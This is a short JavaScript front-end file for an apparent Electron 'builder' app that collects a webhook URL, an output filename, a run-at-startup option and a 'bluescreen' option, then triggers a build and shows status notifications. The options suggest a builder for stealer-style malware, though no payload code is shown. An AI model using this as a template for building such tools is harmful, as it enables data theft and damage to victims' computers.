let isDragging = false;
let offsetX = 0;
let offsetY = 0;

document.addEventListener("DOMContentLoaded", () => {
  document.getElementById("buildButton").addEventListener("click", () => {
    const config = {
      buildType: document.getElementById("buildType").value,
      webhook: document.getElementById("webhook").value,
      filename: document.getElementById("filename").value,
      startup: document.getElementById("startup").checked,
      bluescreen: document.getElementById("bluescreen").checked,
    };

    const statusMessage = document.getElementById("statusMessage");
    statusMessage.textContent = "Waiting... Starting build process.";

    window.electronAPI.startBuild(config);
  });

  window.electronAPI.onBuildComplete((message) => {
    document.getElementById("statusMessage").textContent = "";
    showNotification("✅ Build Complete", "Your file has been successfully built and zipped!");
  });

  window.electronAPI.onBuildError((error) => {
    document.getElementById("statusMessage").textContent = "❌ Build failed. Check the console for errors.";
    showNotification("❌ Build Error", "Something went wrong during the build.");
  });
});

function showNotification(title, message) {
  const notif = document.getElementById("notification");
  notif.innerHTML = `<strong>${title}</strong><br>${message}`;
  notif.classList.add("show");

  setTimeout(() => {
    notif.classList.remove("show");
  }, 4000);
}
